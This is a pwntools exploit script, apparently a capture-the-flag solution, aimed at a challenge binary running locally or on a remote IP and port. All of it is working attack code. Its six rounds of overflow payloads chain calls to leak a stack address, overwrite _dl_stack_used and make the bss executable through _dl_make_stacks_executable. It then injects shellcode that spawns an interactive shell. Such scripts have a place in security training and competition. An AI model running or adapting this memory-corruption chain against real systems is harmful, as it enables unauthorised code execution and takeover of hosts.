from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chal'
HOST = '52.165.26.180'
PORT =  8810

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM nostop pass ignore\n"
    script += "handle SIGSEGV  pass\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [0x19a3])

stack_exec = 0x459200
fflush_all = 0x40a310

rw = b''
rw += b'a'*0x8
rw = rw.ljust(0xe0, b'\x00')
rw += b'/flag\x00'

# round 1: make inf loop with signal(segv, main)
r.sendline(rw)

payload = b''
payload += b'1'*0x18
payload += flat(0x4045d0, elf.sym.main+4, 11)
payload += flat(0x1111, 0x2222)
r.sendline(payload)

# round 2: leak stack with puts(__libc_argv)
r.sendline(rw)

payload = b''
payload += b'2'*0x18
payload += flat(0x0405470, 0 , 0x4b0df8)# puts(libc_argv)
r.sendline(payload)

# round 3: part of leak stack
r.sendline(rw)

payload = b''
payload += b'3'*0x18
payload += flat(fflush_all, 0 , 0)# 
r.sendline(payload)

leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
print(f'{leak:#x}')
stack_endp = (leak & 0xfffffffffffff000) + 0x1000 # somewhere mprotect-able

# round 4: overwrite to _dl_stack_used@0x4b0b20 with strcpy(_dl_stack_used, gbuf+0x10)
rw = b''
rw += flat(0x4b0b20, elf.sym.g_buf+0x10)# fake mprotect info
rw += flat(elf.sym.g_buf-0x3d0 + 8) # fake pointer
r.sendline(rw)

payload = b''
payload += b'4'*0x18
payload += flat(0x468ce0, elf.sym.g_buf+0x10, 0x4b0b20)# 
r.sendline(payload)


# round 5: call dl_make_stacks_executable to make bss rwx
rw = b''
rw += p64(stack_endp-0x10000)
rw += flat(0x4aa000, 0x3000, 0x1000)
r.sendline(rw)

payload = b''
payload += b'5'*0x18
payload += flat(stack_exec, 0 , elf.sym.g_buf)# 
r.sendline(payload)

# round 6: place code and call it
rw = b''
rw += asm(' endbr64 ')
rw += asm(shellcraft.sh())
r.sendline(rw)

payload = b''
payload += b'6'*0x18
payload += flat(elf.sym.g_buf, 0xdead , 0xbeef)# 
r.sendline(payload)

r.interactive()
r.close()

